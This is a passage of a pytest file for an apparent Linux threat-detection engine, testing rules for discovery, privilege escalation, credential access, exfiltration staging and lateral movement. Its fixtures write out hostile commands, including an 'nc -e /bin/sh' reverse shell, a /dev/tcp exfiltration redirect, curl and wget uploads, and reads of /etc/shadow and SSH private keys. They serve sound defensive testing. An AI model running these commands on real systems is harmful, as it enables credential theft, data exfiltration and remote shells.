"""Context-rule catalog: anchor-gated discovery, privilege, credential, staging and lateral rules.

Each rule gets malicious positives, hard-benign lookalikes, without-anchor and disallowed-link cases, a
missing-field case that becomes positive_only_partial (never a clean no-match), lane-policy checks, and
adversarial negatives for the token-aware parsing (grep /dev/tcp, sudo ls -l, scp upload target, local rsync,
env shebang, nc -e, wget -T, tar x/xf, gzip -d, internal-source login). Fixtures use general Linux tradecraft,
never any evaluation dataset's commands, hosts or addresses.
"""
from datetime import UTC, datetime, timedelta

import pytest
from sqlalchemy import func, select

from romulus.agent.models import PivotCoverage
from romulus.decide.policy import decide
from romulus.detect.base import ContextAnchor, ContextLink
from romulus.detect.context import (
    CredentialAccessInContext,
    EntryPointPromotion,
    LateralMovement,
    PostAccessDiscovery,
    PrivilegeProbing,
    StagingAndTransfer,
)
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
from romulus.hunt.context import evaluate_context, finalize_context
from romulus.hunt.expansion import ExpansionEngine
from romulus.hunt.links import LinkResult
from romulus.sources.models import Window
from romulus.store import schema as _schema
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)


def exec_event(event_id, argv, *, executable=None, outcome=Outcome.success, ts=T0, host="web1", session=42,
               **fields):
    typed = {
        "process.executable": fv(executable or argv[0], f"{event_id}:exe"),
        "process.argv": fv(argv, f"{event_id}:argv"),
    }
    if session is not None:
        typed["process.session_id"] = fv(session, f"{event_id}:ses")
    for name, value in fields.items():
        typed[name.replace("__", ".")] = fv(value, f"{event_id}:{name}")
    return TypedEvent(id=event_id, family="process_exec", ts=ts, host=host, outcome=outcome, fields=typed,
                      raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def socket_event(event_id, dst_ip, dst_port, *, syscall="connect", outcome=Outcome.success, ts=T0, host="web1",
                 session=42):
    return TypedEvent(
        id=event_id, family="net_socket", ts=ts, host=host, outcome=outcome,
        fields={"socket.syscall": fv(syscall, f"{event_id}:sc"), "destination.ip": fv(dst_ip, f"{event_id}:dip"),
                "destination.port": fv(dst_port, f"{event_id}:dport"),
                "process.session_id": fv(session, f"{event_id}:ses")},
        raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def auth_event(event_id, *, service="sshd", outcome=Outcome.success, source=None, user="root", phase=None,
               session=42, ts=T0):
    typed = {"auth.service": fv(service, f"{event_id}:svc"), "user.name": fv(user, f"{event_id}:user")}
    if source is not None:
        typed["source.ip"] = fv(source, f"{event_id}:src")
    if phase is not None:
        typed["auth.phase"] = fv(phase, f"{event_id}:phase")
    if session is not None:
        typed["process.session_id"] = fv(session, f"{event_id}:ses")
    return TypedEvent(id=event_id, family="auth", ts=ts, host="web1", outcome=outcome, fields=typed,
                      raw=[RawRef(target="host-x", native_id=event_id, digest="d")], normalizer="test@1")


def anchor(anchor_class="execution"):
    return ContextAnchor(id="F-anchor", anchor_class=anchor_class, lane="urgent",
                         claim="a foothold was recorded", events=[exec_event("anchor-event", ["/bin/sh"])])


def link(strength="observed", link_type="process_lineage", status="complete"):
    return ContextLink(id="L-link", link_type=link_type, strength=strength,
                       key={"host": "web1", "process.session_id": 42},
                       evidence_events=[exec_event("link-event", ["/bin/sh"])], status=status)


def one(playbook, events, *, a=None, link_type="process_lineage", strength="observed"):
    return playbook().consume_linked(a or anchor(), link(strength=strength, link_type=link_type), events)


def _repo():
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": []}, "digest", "test")
    return repo


def _cell(repo, rule_id):
    return next(c for c in repo.rule_cells("h1") if c["rule_id"] == rule_id)


# ------------------------------------------------------------------------------------------------
# Post-access discovery.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["ps", "aux"], "/usr/bin/ps", "T1057"),
    (["ss", "-tunap"], "/usr/bin/ss", "T1049"),
    (["cat", "/etc/os-release"], "/usr/bin/cat", "T1082"),
    (["cat", "/etc/passwd"], "/usr/bin/cat", "T1087"),
    (["df", "-h"], "/usr/bin/df", "T1680"),
    (["systemctl", "list-units"], "/usr/bin/systemctl", "T1007"),
    (["crontab", "-l"], "/usr/bin/crontab", "T1007"),
    (["dpkg", "-l"], "/usr/bin/dpkg", "T1518"),
    (["rpm", "-qa"], "/usr/bin/rpm", "T1518"),
    (["find", "/home", "-name", "*.key"], "/usr/bin/find", "T1083"),
    (["ls", "-la", "/root"], "/usr/bin/ls", "T1083"),
    (["printenv"], "/usr/bin/printenv", "T1082"),
    (["showmount", "-e", "server"], "/usr/sbin/showmount", "T1135"),
    (["chage", "-l", "svc"], "/usr/bin/chage", "T1201"),
])
def test_discovery_single_class_is_a_lead(argv, executable, technique):
    matches = one(PostAccessDiscovery, [exec_event("d", argv, executable=executable)])
    assert len(matches) == 1 and technique in matches[0].notes
    assert matches[0].proposed_lane == "lead" and decide(matches[0], "h").admitted


def test_discovery_burst_of_three_distinct_classes_is_high():
    events = [exec_event("a", ["whoami"], executable="/usr/bin/whoami"),
              exec_event("b", ["uname", "-a"], executable="/usr/bin/uname"),
              exec_event("c", ["ss", "-tunap"], executable="/usr/bin/ss")]
    match = one(PostAccessDiscovery, events)[0]
    assert match.proposed_lane == "high"
    assert {"T1033", "T1082", "T1049"} <= set(match.notes)


@pytest.mark.parametrize("argv,executable", [
    (["apt", "install", "nginx"], "/usr/bin/apt"),
    (["dpkg", "-i", "pkg.deb"], "/usr/bin/dpkg"),
    (["systemctl", "restart", "nginx"], "/usr/bin/systemctl"),
    (["ip", "addr", "add", "10.0.0.5/24", "dev", "eth0"], "/usr/sbin/ip"),
    (["hostname", "web99"], "/usr/bin/hostname"),            # sets the hostname, not discovery
    (["route", "add", "default", "gw", "10.0.0.1"], "/sbin/route"),
    (["arp", "-d", "10.0.0.9"], "/usr/sbin/arp"),
    (["ls", "-la", "/tmp"], "/usr/bin/ls"),
    (["env", "python3", "./x.py"], "/usr/bin/env"),         # a shebang launcher, not enumeration
    (["echo", "cat /etc/passwd"], "/usr/bin/echo"),
])
def test_discovery_rejects_benign_and_modifying_forms(argv, executable):
    assert one(PostAccessDiscovery, [exec_event("b", argv, executable=executable)]) == []


def test_discovery_gating_and_kernel_executable():
    ev = [exec_event("d", ["ss", "-tunap"], executable="/usr/bin/ss")]
    assert PostAccessDiscovery().consume_linked(None, link(), ev) == []
    assert one(PostAccessDiscovery, ev, link_type="host_after_anchor") == []
    assert one(PostAccessDiscovery, ev, a=anchor("network_observation")) == []
    # argv[0] is spoofable; identity comes from the kernel executable.
    assert one(PostAccessDiscovery, [exec_event("s", ["whoami"], executable="/usr/bin/echo")]) == []
    assert one(PostAccessDiscovery, [exec_event("r", ["evil"], executable="/usr/bin/whoami")])


def test_discovery_inferred_link_caps_at_lead():
    events = [exec_event("a", ["whoami"], executable="/usr/bin/whoami"),
              exec_event("b", ["uname", "-a"], executable="/usr/bin/uname"),
              exec_event("c", ["ss"], executable="/usr/bin/ss")]
    match = one(PostAccessDiscovery, events, strength="inferred")[0]
    assert match.proposed_lane == "lead"


# ------------------------------------------------------------------------------------------------
# Privilege probing and escalation.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["sudo", "-l"], "/usr/bin/sudo", "T1548.003"),
    (["sudo", "-u", "root", "-l"], "/usr/bin/sudo", "T1548.003"),
    (["find", "/", "-perm", "-4000"], "/usr/bin/find", "T1548.001"),
    (["find", "/", "-perm", "-u=s"], "/usr/bin/find", "T1548.001"),
    (["getcap", "-r", "/"], "/usr/sbin/getcap", "T1548"),
    (["pkexec", "/bin/sh"], "/usr/bin/pkexec", "T1548"),
    (["cat", "/etc/sudoers"], "/usr/bin/cat", "T1548.003"),
])
def test_privilege_probing_positives_are_lead(argv, executable, technique):
    match = one(PrivilegeProbing, [exec_event("p", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == "lead"
    assert decide(match[0], "h").admitted


@pytest.mark.parametrize("argv,executable", [
    (["sudo", "ls", "-la"], "/usr/bin/sudo"),
    (["sudo", "crontab", "-l"], "/usr/bin/sudo"),
    (["sudo", "wc", "-l", "f"], "/usr/bin/sudo"),
    (["find", "/var/log", "-name", "*.log"], "/usr/bin/find"),
])
def test_privilege_probing_rejects_child_flags_and_plain_find(argv, executable):
    assert one(PrivilegeProbing, [exec_event("b", argv, executable=executable)]) == []


def _root_chain():
    """A non-root login shell (pid 100) under which later root records are spawned."""
    return exec_event("sh", ["bash"], executable="/bin/bash", process__uid="1000", process__euid="1000",
                      process__auid="1000", process__pid=100, process__ppid=50, ts=T0)


def test_privilege_escalation_unbrokered_root_transition_is_high_with_provenance():
    shell = _root_chain()
    root = exec_event("x", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0", process__euid="0",
                      process__auid="1000", process__pid=200, process__ppid=100, ts=T0 + timedelta(seconds=3))
    matches = [m for m in one(PrivilegeProbing, [shell, root]) if "euid0" in m.group_key]
    assert len(matches) == 1 and {"T1548", "T1068"} <= set(matches[0].notes)
    assert matches[0].proposed_lane == "high" and "auid=1000" in matches[0].claim and "uid=0" in matches[0].claim
    fields = {p.field for p in matches[0].predicate}
    assert "process.uid" in fields and "process.auid" in fields


def test_privilege_escalation_brokered_root_transition_is_lead():
    shell = _root_chain()
    sudo = exec_event("su", ["sudo", "-s"], executable="/usr/bin/sudo", process__uid="1000", process__euid="0",
                      process__auid="1000", process__pid=150, process__ppid=100, ts=T0 + timedelta(seconds=1))
    root_shell = exec_event("rs", ["bash"], executable="/bin/bash", process__uid="0", process__euid="0",
                            process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
    matches = [m for m in one(PrivilegeProbing, [shell, sudo, root_shell]) if "euid0" in m.group_key]
    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and "brokered" in matches[0].claim
    assert "T1068" not in matches[0].notes


def test_privilege_escalation_later_unbrokered_root_after_sudo_is_its_own_high_finding():
    shell = _root_chain()
    sudo = exec_event("su", ["sudo", "apt", "update"], executable="/usr/bin/sudo", process__uid="1000",
                      process__euid="0", process__auid="1000", process__pid=150, process__ppid=100,
                      ts=T0 + timedelta(seconds=1))
    sudo_root = exec_event("sr", ["apt", "update"], executable="/usr/bin/apt", process__uid="0", process__euid="0",
                           process__auid="1000", process__pid=160, process__ppid=150, ts=T0 + timedelta(seconds=2))
    exploit = exec_event("ex", ["/tmp/x/exploit"], executable="/tmp/x/exploit", process__uid="0",
                         process__euid="0", process__auid="1000", process__pid=300, process__ppid=100,
                         ts=T0 + timedelta(hours=1))
    euid0 = [m for m in one(PrivilegeProbing, [shell, sudo, sudo_root, exploit]) if "euid0" in m.group_key]
    assert len(euid0) == 2
    high = [m for m in euid0 if m.proposed_lane == "high"]
    assert len(high) == 1 and "exploit" in high[0].claim and "T1068" in high[0].notes


def test_setuid_euid_only_elevation_is_lead_without_t1068():
    passwd = exec_event("p", ["passwd"], executable="/usr/bin/passwd", process__uid="1000", process__euid="0",
                        process__auid="1000", process__pid=120, process__ppid=100)
    matches = [m for m in one(PrivilegeProbing, [passwd]) if "setuid" in m.group_key]
    assert len(matches) == 1 and matches[0].proposed_lane == "lead" and matches[0].notes == ["T1548"]


@pytest.mark.parametrize("uid,euid,auid", [("0", "0", "0"), ("1000", None, "1000")])
def test_privilege_escalation_benign_root_identities(uid, euid, auid):
    fields = {"process__uid": uid, "process__auid": auid, "process__pid": 120, "process__ppid": 100}
    if euid is not None:
        fields["process__euid"] = euid
    out = [m for m in one(PrivilegeProbing, [exec_event("b", ["id"], executable="/usr/bin/id", **fields)])
           if "euid0" in m.group_key or "setuid" in m.group_key]
    assert out == []


# ------------------------------------------------------------------------------------------------
# Credential access.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique,lane", [
    (["cat", "/etc/shadow"], "/usr/bin/cat", "T1003.008", "high"),
    (["cp", "/home/alice/.ssh/id_rsa", "/tmp/k"], "/usr/bin/cp", "T1552.004", "high"),
    (["cp", "-t", "/tmp", "/home/alice/.ssh/id_ed25519"], "/usr/bin/cp", "T1552.004", "high"),
    (["cat", "/proc/1234/mem"], "/usr/bin/cat", "T1003", "high"),
    (["cat", "/home/alice/.bash_history"], "/usr/bin/cat", "T1552.003", "lead"),
    (["cat", "/home/alice/.aws/credentials"], "/usr/bin/cat", "T1552.001", "lead"),
    (["cat", "/home/alice/.netrc"], "/usr/bin/cat", "T1552.001", "lead"),
])
def test_credential_access_tiers(argv, executable, technique, lane):
    match = one(CredentialAccessInContext, [exec_event("c", argv, executable=executable,
                                                        process__cwd="/home/alice")], a=anchor("credential_access"))
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == lane


@pytest.mark.parametrize("argv", [
    ["cat", "/home/alice/.ssh/id_rsa.pub"],
    ["cat", "/home/alice/.ssh/known_hosts"],
    ["cat", "/home/alice/.ssh/authorized_keys"],
    ["cat", "/etc/hostname"],
    ["cat", "/home/alice/.gnupg/gpg.conf"],
    ["cat", "/home/alice/mynetrc"],
])
def test_credential_access_benign_lookalikes(argv):
    assert one(CredentialAccessInContext, [exec_event("b", argv, executable=f"/usr/bin/{argv[0]}")],
               a=anchor("credential_access")) == []


# ------------------------------------------------------------------------------------------------
# Staging and transfer.
# ------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("argv,executable,technique", [
    (["tar", "czf", "/tmp/out.tgz", "/etc"], "/bin/tar", "T1560.001"),
    (["tar", "-czf", "/tmp/out.tgz", "/etc"], "/bin/tar", "T1560.001"),
    (["base64", "/home/alice/report.docx"], "/usr/bin/base64", "T1027.013"),
    (["scp", "/tmp/out.tgz", "user@203.0.113.9:/tmp/"], "/usr/bin/scp", "T1021.004"),
    (["curl", "-T", "/tmp/out.tgz", "http://files.example.test/u"], "/usr/bin/curl", "T1048"),
    (["wget", "--post-file=/tmp/out.tgz", "http://x.test/u"], "/usr/bin/wget", "T1048"),
    (["nc", "-e", "/bin/sh", "203.0.113.9", "4444"], "/bin/nc", "T1048"),
])
def test_staging_transfer_positives_default_lead(argv, executable, technique):
    match = one(StagingAndTransfer, [exec_event("s", argv, executable=executable)])
    assert len(match) == 1 and technique in match[0].notes and match[0].proposed_lane == "lead"


def test_staging_devtcp_only_from_shell_c_redirect():
    good = exec_event("g", ["bash", "-c", "cat f > /dev/tcp/203.0.113.9/443"], executable="/bin/bash")
    assert "T1048" in one(StagingAndTransfer, [good])[0].notes
    grep = exec_event("x", ["grep", "-rn", "/dev/tcp/", "/var/www"], executable="/bin/grep")
    echo = exec_event("e", ["echo", "connect /dev/tcp/h/1"], executable="/bin/echo")
    assert one(StagingAndTransfer, [grep]) == [] and one(StagingAndTransfer, [echo]) == []


@pytest.mark.parametrize("argv,executable", [
    (["tar", "xzf", "/tmp/out.tgz"], "/bin/tar"),
    (["tar", "xf", "/tmp/backup.tgz"], "/bin/tar"),
    (["gzip", "-d", "/etc/passwd.gz"], "/bin/gzip"),
    (["base64", "-d", "/etc/shadow.b64"], "/usr/bin/base64"),
    (["base64", "/tmp/token.txt"], "/usr/bin/base64"),
    (["scp", "/tmp/a", "/tmp/b"], "/usr/bin/scp"),
    (["rsync", "-a", "/srv/a/", "/srv/b/"], "/usr/bin/rsync"),
    (["curl", "http://repo.example.test/pkg"], "/usr/bin/curl"),
    (["wget", "-T", "30", "http://x.test/y.deb"], "/usr/bin/wget"),
])
def test_staging_transfer_benign_lookalikes(argv, executable):
    assert one(StagingAndTransfer, [exec_event("b", argv, executable=executable)]) == []


def test_staging_high_when_sensitive_input_staged_and_session_also_transfers():
    staged = exec_event("a", ["base64", "/home/alice/secrets.txt"], executable="/usr/bin/base64",
                        ts=T0 + timedelta(seconds=1))
    out = exec_event("b", ["scp", "/tmp/s.b64", "user@203.0.113.9:/tmp/"], executable="/usr/bin/scp",
                     ts=T0 + timedelta(seconds=2))
    match = one(StagingAndTransfer, [staged, out])[0]
    assert match.proposed_lane == "high" and {"T1027.013", "T1021.004"} <= set(match.notes)


# ------------------------------------------------------------------------------------------------
# Lateral movement.
# ------------------------------------------------------------------------------------------------

def test_lateral_ssh_client_alone_is_lead_with_target():
    match = one(LateralMovement, [exec_event("l", ["ssh", "admin@10.0.0.9", "id"], executable="/usr/bin/ssh")])
    assert len(match) == 1 and "T1021.004" in match[0].notes and match[0].proposed_lane == "lead"
    assert "10.0.0.9" in match[0].claim


def test_lateral_scp_target_is_the_remote_host_not_a_local_path():
    match = one(LateralMovement, [exec_event("l", ["scp", "/etc/shadow", "user@10.0.0.5:/tmp/"],
                                             executable="/usr/bin/scp")])
    assert len(match) == 1 and "10.0.0.5" in match[0].claim and "/etc/shadow" not in match[0].group_key


def test_lateral_socket_alone_is_lead_but_client_plus_connect_is_high():
    socket_only = one(LateralMovement, [socket_event("sk", "10.0.0.9", 445)])
    assert len(socket_only) == 1 and socket_only[0].proposed_lane == "lead"

    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", ts=T0)
    connect = socket_event("sk2", "10.0.0.9", 22, ts=T0 + timedelta(seconds=2))
    both = one(LateralMovement, [client, connect])
    high = [m for m in both if "addr:10.0.0.9:22" in m.group_key]
    assert high and high[0].proposed_lane == "high" and "T1021.004" in high[0].notes


def test_lateral_unknown_connect_outcome_worded_not_dropped():
    match = one(LateralMovement, [socket_event("sk", "10.0.0.9", 22, outcome=Outcome.unknown)])
    assert len(match) == 1 and "connect() outcome is unknown" in match[0].claim


@pytest.mark.parametrize("event", [
    socket_event("ext", "203.0.113.9", 22),
    socket_event("web", "10.0.0.9", 443),
    socket_event("acc", "10.0.0.9", 22, syscall="accept"),
    socket_event("lo", "127.0.0.1", 22),
    socket_event("ll", "169.254.1.1", 22),
])
def test_lateral_socket_benign_lookalikes(event):
    assert one(LateralMovement, [event]) == []


def test_lateral_local_rsync_is_not_lateral():
    assert one(LateralMovement, [exec_event("r", ["rsync", "-a", "/srv/a/", "/srv/b/"],
                                            executable="/usr/bin/rsync")]) == []


def test_lateral_gated_by_anchor_and_link():
    ev = [socket_event("sk", "10.0.0.9", 22)]
    assert LateralMovement().consume_linked(None, link(), ev) == []
    assert one(LateralMovement, ev, a=anchor("network_observation")) == []


# ------------------------------------------------------------------------------------------------
# Missing fields are counted, never a clean no-match (I3, I10).
# ------------------------------------------------------------------------------------------------

def test_missing_exec_fields_give_positive_only_partial():
    broken = TypedEvent(id="m", family="process_exec", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"process.argv": fv(["id"], "m:argv")},
                        raw=[RawRef(target="host-x", native_id="m", digest="d")], normalizer="test@1")
    for rule_id in ("context.post_access_discovery", "context.privilege_probing",
                    "context.credential_access", "context.staging_and_transfer"):
        repo = _repo()
        evaluate_context(repo, "h1", anchor(), link(), [broken])
        cell = _cell(repo, rule_id)
        assert cell["state"] in ("positive_only_partial", "evaluated_partial")
        assert cell["detail"]["missing_required"] >= 1


def test_lateral_missing_socket_fields_give_positive_only_partial():
    broken = TypedEvent(id="s", family="net_socket", ts=T0, host="web1", outcome=Outcome.success,
                        fields={"socket.syscall": fv("connect", "s:sc")},
                        raw=[RawRef(target="host-x", native_id="s", digest="d")], normalizer="test@1")
    repo = _repo()
    evaluate_context(repo, "h1", anchor(), link(), [broken])
    cell = _cell(repo, "context.lateral_movement")
    assert cell["state"] in ("positive_only_partial", "evaluated_partial")
    assert cell["detail"]["missing_required"] >= 1


# ------------------------------------------------------------------------------------------------
# End-to-end through ExpansionEngine (lateral client + connect -> high).
# ------------------------------------------------------------------------------------------------

WINDOW = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=1))


class _SessionFetcher:
    """Returns both a remote-client exec and an admin-port socket connect through the login_session link,
    at the far edge of the first window (a timestamp-boundary case)."""

    def __init__(self, repo, linked):
        self.repo, self.linked = repo, linked
        self.executor = type("Counter", (), {"source_queries": 0})()

    def fetch(self, anchor_, link_type, window, *, query_cap=None):
        self.executor.source_queries += 1
        ids = [e.id for e in self.linked] if link_type == "login_session" else []
        return LinkResult(
            id=f"L-{anchor_.finding_id}-{link_type}-{window.label}", anchor_id=anchor_.finding_id,
            link_type=link_type, window=window, strength="observed",
            key={"host": anchor_.host, "process.session_id": 42}, status="complete",
            event_ids=ids, evidence_ids=sorted(anchor_.event_ids + ids), task_ids=["T1"],
            coverage=[PivotCoverage(target="host-x", dataset="linux.audit", start=window.start,
                                    end=window.end, status="complete", returned=len(ids), total=len(ids))],
            query_spend=1)


def test_expansion_engine_publishes_high_lateral_finding():
    repo = _repo()
    repo.create_hunt("he", {"window": {"start": WINDOW.start.isoformat(), "end": WINDOW.end.isoformat()},
                            "style": "broad", "targets": [], "pack": {"version": "test", "playbooks": []},
                            "agent_mode": "off", "budgets": {"wall_clock_minutes": 120}}, "digest", "test")
    anchor_exec = exec_event("anchor-event", ["/bin/sh"], host="web1", process__pid=10)
    repo.save_evidence("he", [anchor_exec], {}, None)
    repo.save_candidate({
        "id": "F-anchor", "hunt_id": "he", "rule_id": "host.web_shell", "rule_version": "1",
        "claim": "web service spawned a shell", "claim_type": "observed_action",
        "event_ids": [anchor_exec.id], "predicate_fields": [], "entities": [["host", "web1", "host"]],
        "ts": anchor_exec.ts, "severity": "critical", "confidence": "high", "lane": "urgent",
        "priority": 100.0, "priority_reasons": [], "gate_results": {}, "benign_alternatives": [],
        "next_checks": [], "source_case_id": None, "source_anchor_id": None, "source_link_id": None})
    boundary = T0 + timedelta(minutes=5)
    client = exec_event("cl", ["ssh", "10.0.0.9"], executable="/usr/bin/ssh", ts=T0 + timedelta(minutes=1),
                        host="web1")
    connect = socket_event("sk", "10.0.0.9", 22, ts=boundary, host="web1")
    repo.save_evidence("he", [client, connect], {}, None)

    ExpansionEngine(repo, "he", WINDOW, _SessionFetcher(repo, [client, connect]), max_source_queries=200).run()

    lateral = [c for c in repo.candidates("he") if c["rule_id"] == "context.lateral_movement"]
    assert any(c["lane"] == "high" and "10.0.0.9:22" in c["claim"] for c in lateral)
    assert all(c["source_anchor_id"] == "F-anchor" for c in lateral)


# ------------------------------------------------------------------------------------------------
# Root processes with an unknown parent, and rebuild-on-merge / refutation across windows.
# ------------------------------------------------------------------------------------------------

def _seed_anchor(repo, hunt_id, anchor_id, rule_id, events, *, host="web1"):
    repo.save_evidence(hunt_id, events, {}, None)
    repo.save_candidate({
        "id": anchor_id, "hunt_id": hunt_id, "rule_id": rule_id, "rule_version": "1", "claim": "a foothold",
        "claim_type": "observed_action", "event_ids": [e.id for e in events], "predicate_fields": [],
        "entities": [["host", host, "host"]], "ts": T0, "severity": "critical", "confidence": "high",
        "lane": "urgent", "priority": 100.0, "priority_reasons": [], "gate_results": {},
        "benign_alternatives": [], "next_checks": [], "group_key": anchor_id, "source_case_id": None,
        "source_anchor_id": None, "source_link_id": None})
    repo.save_expansion_anchor({
        "id": anchor_id, "hunt_id": hunt_id, "candidate_id": anchor_id, "depth": 0, "parent_anchor_id": None,
        "host": host, "lane": "urgent", "severity": "critical", "ts": T0, "status": "pending", "reasons": []})


def _seed_link(repo, hunt_id, link_id, anchor_id, link_events, *, link_type="process_lineage",
               strength="observed", status="complete"):
    repo.save_evidence(hunt_id, link_events, {}, None)
    repo.save_expansion_link({
        "id": link_id, "hunt_id": hunt_id, "anchor_id": anchor_id, "link_type": link_type,
        "window_label": "anchor ±5 min", "window_start": T0 - timedelta(minutes=5),
        "window_end": T0 + timedelta(minutes=5), "strength": strength, "key": {"process.session_id": 42},
        "status": status, "event_ids": [e.id for e in link_events], "evidence_ids": [], "task_ids": [],
        "coverage": [], "reasons": [], "duration_ms": 0, "query_spend": 0, "evaluated": 1})


def _audit_count(repo, action):
    with repo.engine.connect() as c:
        return c.execute(select(func.count()).select_from(_schema.audit_event)
                         .where(_schema.audit_event.c.action == action)).scalar()


def _discovery(rule_cands):
    return [c for c in rule_cands if c["rule_id"] == "context.post_access_discovery"]


def test_root_with_unknown_parent_is_a_single_aggregated_lead_never_high():
    # Three root records whose parent exec (pid 500) is not in the link events or the anchor's events.
    roots = [exec_event(f"r{i}", [cmd], executable=f"/usr/bin/{cmd}", process__uid="0", process__euid="0",
                        process__auid="1000", process__pid=200 + i, process__ppid=500)
             for i, cmd in enumerate(("cat", "systemctl", "vim"))]
    out = [m for m in one(PrivilegeProbing, roots) if "euid0" in m.group_key]
    assert len(out) == 1 and out[0].proposed_lane == "lead" and out[0].notes == ["T1548"]
    assert "parent exec is not in the linked records" in out[0].claim and "3 record(s)" in out[0].claim


def test_two_anchors_one_session_form_a_discovery_burst_high():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    _seed_anchor(repo, "h1", "F-B", "host.web_shell", [exec_event("fb", ["/bin/sh"], process__pid=8)])
    _seed_link(repo, "h1", "L-A", "F-A", [exec_event("id", ["id"], executable="/usr/bin/id"),
                                          exec_event("uname", ["uname", "-a"], executable="/usr/bin/uname")])
    _seed_link(repo, "h1", "L-B", "F-B", [exec_event("ps", ["ps", "aux"], executable="/usr/bin/ps"),
                                          exec_event("ss", ["ss", "-tunap"], executable="/usr/bin/ss")])
    finalize_context(repo, "h1")
    final = _discovery(repo.candidates("h1"))
    assert len(final) == 1 and final[0]["lane"] == "high"
    assert "4 command(s)" in final[0]["claim"] and "4 distinct" in final[0]["claim"]


def test_finalize_is_independent_of_link_seed_order():
    def run(order):
        repo = _repo()
        _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
        _seed_anchor(repo, "h1", "F-B", "host.web_shell", [exec_event("fb", ["/bin/sh"], process__pid=8)])
        links = {
            "A": ("L-A", "F-A", [exec_event("id", ["id"], executable="/usr/bin/id"),
                                 exec_event("uname", ["uname"], executable="/usr/bin/uname")]),
            "B": ("L-B", "F-B", [exec_event("ps", ["ps"], executable="/usr/bin/ps"),
                                 exec_event("ss", ["ss"], executable="/usr/bin/ss")]),
        }
        for key in order:
            _seed_link(repo, "h1", *links[key])
        finalize_context(repo, "h1")
        row = _discovery(repo.candidates("h1"))[0]
        return (row["lane"], row["claim"], tuple(sorted(row["event_ids"])), row["source_link_id"],
                tuple(tuple(sorted(r.items())) for r in row["gate_results"]["_context_reaches"]))
    assert run(["A", "B"]) == run(["B", "A"])


def test_host_after_records_never_join_a_lineage_discovery_group():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    _seed_link(repo, "h1", "L-lin", "F-A", [exec_event("id", ["id"], executable="/usr/bin/id")],
               link_type="process_lineage")
    _seed_link(repo, "h1", "L-ha", "F-A",
               [exec_event("df", ["df"], executable="/usr/bin/df"),
                exec_event("ps", ["ps"], executable="/usr/bin/ps"),
                exec_event("ss", ["ss"], executable="/usr/bin/ss")], link_type="host_after_anchor")
    finalize_context(repo, "h1")
    disc = _discovery(repo.candidates("h1"))
    assert len(disc) == 1 and disc[0]["lane"] == "lead" and "1 distinct" in disc[0]["claim"]


def test_anchor_exec_is_never_counted_one_link_or_the_same_twice():
    def run(count):
        repo = _repo()
        _seed_anchor(repo, "h1", "F-A", "host.web_shell",
                     [exec_event("wa", ["whoami"], executable="/usr/bin/whoami")])
        shared = [exec_event("un", ["uname", "-a"], executable="/usr/bin/uname"),
                  exec_event("ps", ["ps"], executable="/usr/bin/ps")]
        for i in range(count):
            _seed_link(repo, "h1", f"L{i}", "F-A", shared, link_type="process_lineage")
        finalize_context(repo, "h1")
        row = _discovery(repo.candidates("h1"))[0]
        return row["lane"], row["claim"], tuple(sorted(row["event_ids"]))
    result = run(1)
    assert result == run(2) and result[0] == "lead" and "2 distinct" in result[1]


def test_scenario_a_internal_login_in_another_session_does_not_withdraw_external_entry():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.ssh_login_external_source",
                 [exec_event("fa", ["/bin/sh"], process__session_id=42)])
    _seed_link(repo, "h1", "L-ext", "F-A", [auth_event("ext", source="203.0.113.8", phase="login", session=42)],
               link_type="login_session")
    _seed_link(repo, "h1", "L-int", "F-A", [auth_event("int2", source="10.0.0.8", phase="login", session=99)],
               link_type="login_session")
    finalize_context(repo, "h1")
    entry = [c for c in repo.candidates("h1") if c["rule_id"] == "context.entry_point_promotion"]
    assert any(c["lane"] == "high" and c["group_key"].endswith("|42") for c in entry)
    assert not any(c["group_key"].endswith("|99") for c in entry)


def test_entry_point_internal_source_in_its_own_session_is_not_promoted():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.ssh_login_external_source",
                 [exec_event("fa", ["/bin/sh"], process__session_id=42)])
    _seed_link(repo, "h1", "L-ext", "F-A", [auth_event("ext", source="203.0.113.8", phase="login", session=42)],
               link_type="login_session")
    finalize_context(repo, "h1")
    entry = next(c for c in repo.candidates("h1") if c["rule_id"] == "context.entry_point_promotion")
    assert entry["lane"] == "high"
    # a wider reach of the SAME session shows an internal source: withdraw to context, audited once.
    _seed_link(repo, "h1", "L-int", "F-A",
               [auth_event("ext", source="203.0.113.8", phase="login", session=42),
                auth_event("int", source="10.0.0.8", phase="session_open", session=42)],
               link_type="login_session")
    finalize_context(repo, "h1")
    entry = next(c for c in repo.candidates("h1") if c["rule_id"] == "context.entry_point_promotion")
    assert entry["lane"] == "context" and "withdrawn" in entry["claim"]
    assert _audit_count(repo, "context.finalize") >= 1


def test_root_known_transition_wins_over_unknown_parent_across_reaches():
    repo = _repo()
    _seed_anchor(repo, "h1", "F-A", "host.web_shell", [exec_event("fa", ["/bin/sh"], process__pid=9)])
    root = exec_event("r", ["cat", "/root/x"], executable="/usr/bin/cat", process__uid="0", process__euid="0",
